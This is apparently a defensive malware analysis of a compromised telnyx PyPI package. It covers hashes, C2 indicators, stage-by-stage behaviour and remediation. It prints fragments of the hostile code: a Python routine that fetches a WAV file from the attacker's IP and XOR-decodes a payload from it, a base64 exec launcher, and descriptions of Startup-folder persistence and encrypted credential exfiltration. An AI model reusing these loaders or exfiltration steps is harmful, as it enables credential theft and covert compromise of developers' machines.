# telnyx 4.87.1 / 4.87.2 Supply Chain Compromise — Full Analysis

**Package:** `telnyx==4.87.1`, `telnyx==4.87.2` (PyPI)
**Date of analysis:** 2026-03-27
**Threat actor:** TeamPCP (same RSA key, exfil pattern, and `tpcp.tar.gz` filename as the litellm compromise)
**Malicious file:** `telnyx/_client.py` (injected ~11,700 bytes of malicious code)
**C2 server:** `83[.]142[.]209[.]203:8080`
**Exfiltration endpoint:** `hxxp://83[.]142[.]209[.]203:8080/` (POST)

---

## File Hashes

### Wheel packages

| File | Hash |
|------|------|
| `telnyx-4.87.1-py3-none-any.whl` | **SHA256:** `7321caa303fe96ded0492c747d2f353c4f7d17185656fe292ab0a59e2bd0b8d9` |
| | **MD5:** `188d8592f393ce45f7273102f02efee1` |
| `telnyx-4.87.2-py3-none-any.whl` | **SHA256:** `cd08115806662469bbedec4b03f8427b97c8a4b3bc1442dc18b72b4e19395fe3` |
| | **MD5:** `5870a0bf82bbdf2687d8dce89dfa668f` |

### Injected artifacts

| Artifact | Stage | MD5 | SHA256 |
|----------|-------|-----|--------|
| `_client.py` (4.87.1) | 0 (trigger) | `b1c6036b046bcf8c80601742ebcc61b0` | `23b1ec58649170650110ecad96e5a9490d98146e105226a16d898fbe108139e5` |
| `_client.py` (4.87.2) | 0 (trigger) | `9e837f0b9e8037b06256e2ec4291f757` | `ab4c4aebb52027bf3d2f6b2dcef593a1a2cff415774ea4711f7d6e0aa1451d4e` |
| Decoded Linux payload (`stage1_orchestrator.py`) | 1 (orchestrator) | `599a186de45023bddfb37ba52d69dbf5` | `84edce66f09c55bbb44754411bde4b092288d172734df62fac20d6f794b3a2ec` |

---

## Overview

This is a two-platform supply chain attack injected into the legitimate `telnyx` PyPI package. The attack modifies `_client.py` — the SDK's main client module — embedding OS-specific payload delivery and execution logic at the module level. The code runs on **any `import telnyx`** statement, which occurs in every application using the Telnyx SDK.

The same RSA-4096 public key, exfil header (`X-Filename: tpcp.tar.gz`), and hybrid encryption scheme used in the litellm compromise (2026-03-24) confirm this is the same threat actor: **TeamPCP**.

### Key differences from the litellm attack

| Aspect | litellm | telnyx |
|--------|---------|--------|
| Trigger mechanism | `.pth` file (runs on any Python invocation) | `import telnyx` (runs when SDK is imported) |
| Payload delivery | Base64 blob embedded directly | WAV steganography — payloads hidden inside `.wav` files |
| Platforms | Linux only | **Both Windows and Linux** (separate code paths) |
| Stage 2 location | Embedded in `.pth` | Downloaded from C2 at runtime |
| C2 infrastructure | `models.litellm.cloud`, `checkmarx.zone` | `83[.]142[.]209[.]203:8080` (bare IP) |
| Obfuscation | Minimal | Base64 string obfuscation via `_d()` helper |

---

## Stage 0: Trigger — `telnyx/_client.py`

**File:** `telnyx/_client.py` (351,121 bytes in malicious version vs 339,399 bytes clean)
**Mechanism:** Module-level code execution on import

### Injected code locations

The attacker modified `_client.py` in four places:

1. **Lines 4-10, 16:** Added malicious imports at the top of the file:
   ```python
   import subprocess
   import tempfile
   import time
   import os
   import base64
   import sys
   import wave
   # ... later ...
   import urllib.request
   ```

2. **Lines 41-42:** Added a base64 decode helper:
   ```python
   def _d(s):
       return base64.b64decode(s).decode('utf-8')
   ```

3. **Lines 459-460:** Embedded the Linux payload as a massive base64-encoded string (`_p`), containing the full Stage 1 orchestrator (~3,320 bytes decoded).

4. **Lines 7761-7825:** Three new functions plus invocations:
   - `setup()` — Windows payload (lines 7761-7804)
   - `FetchAudio()` — Linux payload launcher (lines 7806-7817)
   - `Setup()` / `setup()` invocation (line 7823)
   - `FetchAudio()` invocation (line 7825)

### Platform routing

```python
# Windows path (setup function)
def setup():
    if os.name != 'nt':  # Skip non-Windows
        return
    # ... Windows-specific payload delivery ...

# Linux path (FetchAudio function)
def FetchAudio():
    if os.name == 'nt':  # Skip Windows
        return
    # ... Linux-specific payload delivery ...

# Both called at module level:
Setup()       # 4.87.1 — BUG: calls Setup() but function is defined as setup()
setup()       # 4.87.2 — Fixed the case bug
FetchAudio()  # Both versions
```

### Version difference: 4.87.1 vs 4.87.2

The **only** difference between the two versions is a single character on line 7823:

- **4.87.1:** `Setup()` — calls `Setup` with capital S, but the function is defined as `setup` (lowercase). This is a **bug** — on Linux, Python is case-sensitive, so the Windows payload function **never executes** in 4.87.1. The `NameError` is silently caught by the bare `except: pass` pattern.
- **4.87.2:** `setup()` — fixes the case mismatch, enabling the Windows attack path.

The Linux `FetchAudio()` path works correctly in both versions.

---

## Stage 0a: Windows Attack Path — `setup()`

**Target:** Windows systems (`os.name == 'nt'`)
**Payload URL:** `hxxp://83[.]142[.]209[.]203:8080/hangup.wav`
**Persistence location:** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe`

### Execution flow

```
1. Check if msbuild.exe already exists in Startup → if yes, abort (already infected)
2. Check if msbuild.exe.lock exists and is < 12 hours old → if yes, abort (rate limiting)
3. Create msbuild.exe.lock as a marker, set it hidden via `attrib +h`
4. Download hangup.wav from C2 (hxxp://83[.]142[.]209[.]203:8080/hangup.wav)
5. Open as WAV file, read audio frames
6. Base64-decode the frame data
7. XOR-decrypt: first 8 bytes = key, remainder = ciphertext
8. Write decrypted binary to msbuild.exe in Windows Startup folder
9. Delete temp WAV file
10. Execute msbuild.exe with CREATE_NO_WINDOW flag (0x08000000)
```

### Deobfuscated strings

| Obfuscated (base64) | Decoded |
|----------------------|---------|
| `QVBQREFUQQ==` | `APPDATA` |
| `TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw` | `Microsoft\Windows\Start Menu\Programs\Startup` |
| `bXNidWlsZC5leGU=` | `msbuild.exe` |
| `LmxvY2s=` | `.lock` |
| `LnRtcA==` | `.tmp` |
| `aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg==` | `hxxp://83[.]142[.]209[.]203:8080/hangup.wav` |

### Persistence mechanism

The Windows payload achieves persistence by writing a binary named `msbuild.exe` to the Windows Startup folder:

```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe
```

This binary executes automatically on every Windows login. The name `msbuild.exe` masquerades as Microsoft's legitimate MSBuild tool, which normally lives in `C:\Windows\Microsoft.NET\Framework\`.

A lock file (`msbuild.exe.lock`) with a hidden attribute prevents re-infection attempts within a 12-hour window, avoiding repeated downloads that might trigger network detection.

### Key properties

- **Binary payload** — the decoded content from `hangup.wav` is a native Windows executable, not Python
- **CREATE_NO_WINDOW** — uses flag `0x08000000` to launch without a visible console
- **Rate limiting** — 12-hour cooldown via `.lock` file prevents repeated C2 contact
- **Self-hiding** — lock file is hidden via `attrib +h`

---

## Stage 0b: Linux Attack Path — `FetchAudio()`

**Target:** Non-Windows systems (`os.name != 'nt'`)
**Mechanism:** Spawns a detached background process running the decoded Stage 1

### Execution flow

```
FetchAudio()
    |
    v
subprocess.Popen(
    [python, "-c", "import base64; exec(base64.b64decode('...'))"],
    start_new_session=True    # Detaches from parent
)
    |
    v
Stage 1 orchestrator runs in background
```

The parent Python process continues normally, making the attack invisible to the user. The `start_new_session=True` flag ensures the child process survives if the parent is killed.

---

## Stage 1: Linux Orchestrator — Decoded Payload

**Purpose:** Download credential collector from C2 via WAV steganography, execute it, encrypt and exfiltrate the output.

### WAV Steganography

The attack uses a novel payload delivery technique — embedding malicious code inside WAV audio files:

```python
WAV_URL = "hxxp://83[.]142[.]209[.]203:8080/ringtone.wav"

# 1. Download WAV file
req = urllib.request.Request(WAV_URL, headers={'User-Agent': 'Mozilla/5.0'})
with urllib.request.urlopen(req, timeout=15) as r:
    with open(wf, "wb") as f:
        f.write(r.read())

# 2. Extract hidden payload from audio frames
with wave.open(wf, 'rb') as w:
    raw = base64.b64decode(w.readframes(w.getnframes()))
    s, data = raw[:8], raw[8:]
    payload = bytes([data[i] ^ s[i % len(s)] for i in range(len(data))])
```

The decoding process:
1. Read all audio frames from the WAV file
2. Base64-decode the raw frame data
3. Split into 8-byte XOR key and ciphertext
4. XOR-decrypt to recover the Stage 2 Python script

This is the **same steganography technique** used for both platforms — `ringtone.wav` (Linux) delivers a Python credential collector, `hangup.wav` (Windows) delivers a native PE binary.

### Credential collection and exfiltration

```
1. Decode Stage 2 from ringtone.wav via WAV steganography
2. Execute Stage 2 via subprocess.run([python, "-"], input=payload)
   - Stage 2 outputs all collected data to stdout → captured to temp file
3. Generate random 256-bit AES session key via openssl rand
4. Encrypt collected data with AES-256-CBC (PBKDF2) using session key
5. Encrypt session key with RSA-4096 public key (OAEP padding)
6. Bundle payload.enc + session.key.enc into tpcp.tar.gz
7. POST to hxxp://83[.]142[.]209[.]203:8080/ via curl
```

### Exfiltration request

```
POST hxxp://83[.]142[.]209[.]203:8080/
Content-Type: application/octet-stream
X-Filename: tpcp.tar.gz
Body: [AES-encrypted credentials + RSA-encrypted session key]
```

### RSA-4096 public key

The embedded RSA public key is **identical** to the one used in the litellm supply chain attack (2026-03-24):

```
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
08qNLwm3kxzFSMj84M16lmIEeQA8u1X8DGK0EmNg7m3J6C3KzFeIzvz0UTgSq6cV
pQWpiuQa+UjTkWmC8RDDXO8G/opLGQnuQVvgsZWuT31j/Qop6rtocYsayGzCFrMV
...
rn3JMF0xZyXNRpQ/fZZxl40CAwEAAQ==
-----END PUBLIC KEY-----
```

This confirms the same attacker holds the corresponding RSA private key and can decrypt all stolen data from both campaigns.

---

## Stage 2: Credential Collector (remote — not embedded)

Unlike the litellm attack where Stage 2 was embedded in the package, the telnyx variant **downloads Stage 2 at runtime** from `ringtone.wav` (Linux) or `hangup.wav` (Windows). This means:

1. The credential collector code is not present in the wheel for static analysis
2. The C2 server can update the payload at any time
3. The C2 (`83[.]142[.]209[.]203:8080`) was offline at the time of this analysis, so the Stage 2 payload could not be retrieved

Given the shared RSA key and identical exfiltration format (`tpcp.tar.gz`, AES-256-CBC + RSA-4096 OAEP), the Stage 2 credential collector is almost certainly the same one used in the litellm attack, targeting:

- SSH keys and configs
- Cloud credentials (AWS, GCP, Azure)
- Kubernetes configs and secrets
- Environment files (`.env*`)
- Database credentials
- Docker registry tokens
- Cryptocurrency wallets
- Shell history
- TLS private keys

---

## Attack Flow Summary

```
pip install telnyx==4.87.1 (or 4.87.2)
        |
        v
import telnyx (in user's application)
        |
        v
telnyx/_client.py module-level code executes
        |
        +---[Windows]---> setup():
        |       1. Check msbuild.exe not already installed
        |       2. Download hangup.wav from C2
        |       3. WAV steganography → XOR decrypt → PE binary
        |       4. Write to %APPDATA%\...\Startup\msbuild.exe
        |       5. Execute with CREATE_NO_WINDOW
        |       6. Binary runs on every login (persistence)
        |
        +---[Linux]-----> FetchAudio():
                1. Spawn detached background process
                2. Decode embedded base64 → Stage 1 orchestrator
                        |
                        v
                3. Download ringtone.wav from C2
                4. WAV steganography → XOR decrypt → Python script
                5. Execute Stage 2 credential collector
                        |
                        v
                6. Encrypt collected data (AES-256-CBC)
                7. Encrypt session key (RSA-4096 OAEP)
                8. Bundle as tpcp.tar.gz
                9. POST to hxxp://83[.]142[.]209[.]203:8080/
                        |
                        v
                Only attacker (RSA privkey holder) can decrypt
```

---

## Indicators of Compromise (IOCs)

### Packages

| Package | SHA256 |
|---------|--------|
| `telnyx-4.87.1-py3-none-any.whl` | `7321caa303fe96ded0492c747d2f353c4f7d17185656fe292ab0a59e2bd0b8d9` |
| `telnyx-4.87.2-py3-none-any.whl` | `cd08115806662469bbedec4b03f8427b97c8a4b3bc1442dc18b72b4e19395fe3` |

### Network

| Indicator | Purpose |
|-----------|---------|
| `83[.]142[.]209[.]203:8080` | C2 server |
| `hxxp://83[.]142[.]209[.]203:8080/hangup.wav` | Windows payload (PE binary in WAV) |
| `hxxp://83[.]142[.]209[.]203:8080/ringtone.wav` | Linux payload (Python script in WAV) |
| `hxxp://83[.]142[.]209[.]203:8080/` | Credential exfiltration endpoint (POST) |

### Files — Windows

| Path | Description |
|------|-------------|
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe` | Dropped PE binary (persistence) |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe.lock` | Hidden lock file (rate limiting) |

### Files — Linux

| Path | Description |
|------|-------------|
| `<site-packages>/telnyx/_client.py` | Modified SDK client with embedded payload |

### Exfiltration

| Header | Value |
|--------|-------|
| `Content-Type` | `application/octet-stream` |
| `X-Filename` | `tpcp.tar.gz` |

### Shared IOCs with litellm compromise

| IOC | Shared? |
|-----|---------|
| RSA-4096 public key (`vahaZDo8mucu...`) | Yes — identical key |
| Exfil filename `tpcp.tar.gz` | Yes |
| AES-256-CBC + RSA-4096 OAEP encryption scheme | Yes |
| `X-Filename` exfil header | Yes |
| TeamPCP threat group attribution | Yes |

---

## Remediation

1. **Uninstall immediately:** `pip uninstall telnyx && pip install telnyx==4.85.0`
2. **Windows cleanup:**
   ```cmd
   del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe"
   attrib -h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe.lock"
   del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe.lock"
   ```
3. **Rotate ALL credentials** — SSH keys, cloud IAM, K8s tokens, API keys, database passwords, registry tokens
4. **Audit:** Check for unauthorized access using stolen credentials
5. **Network:** Block `83[.]142[.]209[.]203` at firewall/DNS level
6. **Verify package integrity:** `pip show telnyx` — ensure version is not 4.87.1 or 4.87.2
